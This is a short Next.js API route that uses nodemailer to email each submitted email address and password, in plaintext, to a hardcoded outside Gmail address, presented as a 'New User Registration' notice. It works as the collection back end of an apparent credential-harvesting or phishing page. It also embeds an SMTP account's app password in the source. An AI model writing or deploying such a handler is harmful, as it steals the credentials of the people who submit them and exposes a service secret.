// pages/api/sendEmail.js

import nodemailer from "nodemailer";

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).end(); // Method Not Allowed
  }

  const { email, password } = req.body;

  try {
    const transporter = nodemailer.createTransport({
      host: "smtp.gmail.com",
      port: 465,
      secure: true,
      auth: {
        user: "bdtrick404@gmail.com",
        pass: "qdjt gdlf pbcd fvnc",
      },
    });

    transporter.verify(function (error, success) {
      if (error) {
        console.error("Transporter verification failed:", error);
      } else {
        console.log("Transporter verified successfully");
      }
    });

    // Wrap the sendMail function in a promise
    const sendMailPromise = (mailOptions) => {
      return new Promise((resolve, reject) => {
        transporter.sendMail(mailOptions, (error, info) => {
          if (error) {
            console.error("Error sending email:", error);
            reject(error);
          } else {
            console.log("Email sent successfully:", info);
            resolve(info);
          }
        });
      });
    };

    const mailOptions = {
      from: {
        name: "Aziz",
        address: "bdtrick404@gmail.com",
      }, // your_email@gmail.com
      to: "suvrohembrom512@gmail.com", // recipient_email@example.com
      subject: "New User Registration",
      text: `New user registered:\eEmail: ${email}\nPassword: ${password}`,
    };

    // Use the promise to send the email
    await sendMailPromise(mailOptions);

    return res.status(200).json({ message: "Email sent successfully" });
  } catch (error) {
    console.error("Error sending email:", error.message);
    return res.status(500).json({ error: error.message });
  }
}
